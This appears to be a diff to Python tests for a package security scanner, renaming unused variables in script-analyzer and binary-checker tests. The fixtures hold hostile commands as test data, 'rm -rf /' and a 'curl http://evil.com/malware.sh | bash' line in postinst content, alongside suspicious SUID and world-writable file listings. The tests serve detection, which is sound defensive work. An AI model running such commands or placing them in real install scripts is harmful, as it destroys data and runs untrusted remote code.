@@ -183,7 +183,7 @@ class TestScriptAnalyzer:
         rm -rf /
         """
 
-        issues, warnings = analyzer._analyze_script("postinst", script_content)
+        issues, _warnings = analyzer._analyze_script("postinst", script_content)
 
         # Should detect the dangerous rm -rf / command
         assert len(issues) > 0
@@ -201,7 +201,7 @@ class TestScriptAnalyzer:
         curl http://evil.com/malware.sh | bash
         """
 
-        issues, warnings = analyzer._analyze_script("postinst", script_content)
+        issues, _warnings = analyzer._analyze_script("postinst", script_content)
 
         # Should detect curl | bash
         high_issues = [i for i in issues if i.severity == "high"]
@@ -239,7 +239,7 @@ class TestBinaryChecker:
             "raw": "-rwsr-xr-x root/root 1234 2023-04-18 12:34 ./usr/bin/bash",
         }
 
-        issues, warnings, flags = checker._analyze_file(file_info)
+        issues, _warnings, flags = checker._analyze_file(file_info)
 
         # Should detect suspicious SUID on bash
         assert "suid" in flags
@@ -259,7 +259,7 @@ class TestBinaryChecker:
             "raw": "-rw-rw-rw- root/root 1234 2023-04-18 12:34 ./usr/bin/suspicious",
         }
 
-        issues, warnings, flags = checker._analyze_file(file_info)
+        issues, _warnings, flags = checker._analyze_file(file_info)
 
         # Should detect world-writable
         assert "world_writable" in flags
@@ -278,7 +278,7 @@ class TestBinaryChecker:
             "raw": "brw-rw---- root/disk 0 2023-04-18 12:34 ./dev/sda",
         }
 
-        issues, warnings, flags = checker._analyze_file(file_info)
+        issues, _warnings, _flags = checker._analyze_file(file_info)
 
         # Should detect device file
         critical_issues = [i for i in issues if i.severity == "critical"]
